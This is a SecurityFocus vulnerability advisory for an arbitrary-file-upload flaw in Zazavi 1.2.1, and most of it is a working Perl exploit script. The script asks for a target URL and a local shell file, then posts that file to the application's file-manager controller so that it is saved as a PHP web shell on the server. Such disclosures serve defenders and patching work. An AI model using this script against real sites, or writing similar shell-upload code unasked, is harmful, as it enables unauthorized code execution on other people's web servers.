source: http://www.securityfocus.com/bid/49309/info

Zazavi is prone to an arbitrary-file-upload vulnerability because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this issue to upload arbitrary code and run it in the context of the webserver process.

Zazavi 1.2.1 is vulnerable; other versions may also be affected. 

#!/usr/bin/perl
system ("title KedAns-Dz");
system ("color 1e");
system ("cls");
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request::Common;
print <<INTRO;
|==========================================|
|= Zazavi <=1.2.1 * Arbitrary Shell Upload |
|=   >> Provided By KedAns-Dz <<           |
|=  e-mail : ked-h[at]hotmail.com          |
|==========================================|
INTRO
print "\n";
print "[*] Enter URL(f.e: http://target.com): ";
    chomp(my $url=<STDIN>);
print "\n";
print "[*] Enter File Path (f.e: C:\\Shell.php.gif): "; # File Path For Upload (usage : C:\\Sh3ll.php.gif)
    chomp(my $file=<STDIN>);
my $ua = LWP::UserAgent->new;
my $re = $ua->request(POST $url.'/admin/editor/filemanager/controller.php',
               Content_Type => 'multipart/form-data',
               Content      => 
				[ 
				action => 'uploadFile',
				newfile => 'DzOffendersCr3w.php',
				filepath => $file,
				] );
print "\n";
if($re->is_success) {
    if( index($re->content, "Disabled") != -1 ) { print "[+] Exploit Successfull! File Uploaded!\n"; }
    else { print "[-] File Upload Is Disabled! Failed!\n"; }
} else { print "[-] HTTP request Failed!\n"; }
exit;